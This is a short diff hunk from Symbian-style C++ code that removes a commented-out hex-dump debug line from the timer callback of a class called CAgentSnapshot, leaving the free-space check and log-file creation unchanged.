@@ -95,7 +95,6 @@ void CAgentSnapshot::TimerExpiredL(TAny* src)
 		RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
 		if(value)
 			{
-			//__FLOG_HEXDUMP(buf.Ptr(), buf.Length());
 			TSnapshotAdditionalData additionalData;
 		
 			CLogFile* logFile = CLogFile::NewLC(iFs);
